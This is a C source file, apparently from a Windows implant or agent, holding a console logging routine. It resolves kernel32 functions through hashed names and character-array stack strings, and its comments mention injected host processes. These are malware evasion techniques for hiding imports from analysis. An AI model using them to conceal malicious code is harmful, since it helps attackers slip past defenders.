#include "logger.h"
#include "types.h"
#include "djb2.h"

#ifdef LOGGING_ENABLED

#include "system.h"
#include "wintypes.h"

#define STD_OUTPUT_HANDLE  ((DWORD)-11)

void log_write(const char* buffer, unsigned long len)
{
    if (buffer == NULL || len == 0)
        return;

    HANDLE (WINAPI *pGetStdHandle)(DWORD) =
        (HANDLE (WINAPI *)(DWORD))
        ResolveFromModuleByHash(Hash((WCHAR[]){L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0'}), 
                            Hash((WCHAR[]){L'G', L'e', L't', L'S', L't', L'd', L'H', L'a', L'n', L'd', L'l', L'e', L'\0'}));
    BOOL (WINAPI *pWriteFile)(HANDLE, const void *, DWORD, DWORD *, PVOID) =
        (BOOL (WINAPI *)(HANDLE, const void *, DWORD, DWORD *, PVOID))
        ResolveFromModuleByHash(Hash((WCHAR[]){L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0'}), 
                            Hash((WCHAR[]){L'W', L'r', L'i', L't', L'e', L'F', L'i', L'l', L'e', L'\0'}));

    if (pGetStdHandle == NULL || pWriteFile == NULL)
        return;

    HANDLE stdout_handle = pGetStdHandle(STD_OUTPUT_HANDLE);

    /* A console-less host (injected cmd.exe, GUI parent) yields
     * INVALID_HANDLE_VALUE (-1), not NULL - a NULL-only check passes
     * it straight into WriteFile and crashes the host. No console =
     * nowhere to log: drop the line, keep the agent alive. */
    if (!stdout_handle || stdout_handle == (HANDLE)-1)
        return;

    DWORD written = 0;
    pWriteFile(stdout_handle, (void*)buffer, (DWORD)len, &written, NULL);
}

#endif /* LOGGING_ENABLED */
